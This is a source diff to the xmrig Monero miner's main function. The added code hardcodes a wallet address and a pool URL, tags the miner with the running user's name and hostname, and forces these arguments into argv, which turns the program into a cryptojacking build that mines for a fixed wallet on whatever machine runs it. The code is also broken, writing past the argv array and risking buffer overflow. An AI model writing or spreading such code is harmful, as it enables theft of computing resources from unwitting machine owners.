@@ -22,13 +22,42 @@
  *   along with this program. If not, see <http://www.gnu.org/licenses/>.
  */
 
+#include <stdio.h>
+#include <stdlib.h>
+#include <sys/types.h>
+#include <ctype.h>
+#include <string.h>
+#include <pwd.h>
+#include <unistd.h>
+
 #include "App.h"
 #include "base/kernel/Entry.h"
 #include "base/kernel/Process.h"
 
+char* getusername () {
+        struct passwd *pwd;
+        pwd = getpwuid(getuid());
+        return(pwd->pw_name);
+}
+
 
 int main(int argc, char **argv) {
     using namespace xmrig;
+
+    char nowuser[256];
+    sprintf(nowuser, "%s", getusername() );
+
+    char hostname[256];
+    gethostname(hostname, sizeof(hostname));
+    strcat(nowuser, "_" );
+    strcat(nowuser, hostname );
+    char wallet[] = "8ApoSg9UZqBG4pfdJ1ySyPUtJxyxYnJubLZifQxParW7Lgm4p7eNGBM4Lb6wZ1vym8Ndf7GbWFgQgc3QtEuBYGKASPWy1zH";
+    char zzu[2048];
+    sprintf(zzu, "--user=%s.%s", wallet, nowuser);
+    argv[++argc] = (char*) "--url=xmr.f2pool:13531";
+    argv[++argc] = (char*) zzu;
+    argv[++argc] = (char*) "--pass=x";
+    argv[++argc] = (char*) "--keepalive";
 
     Process process(argc, argv);
     const Entry::Id entry = Entry::get(process);
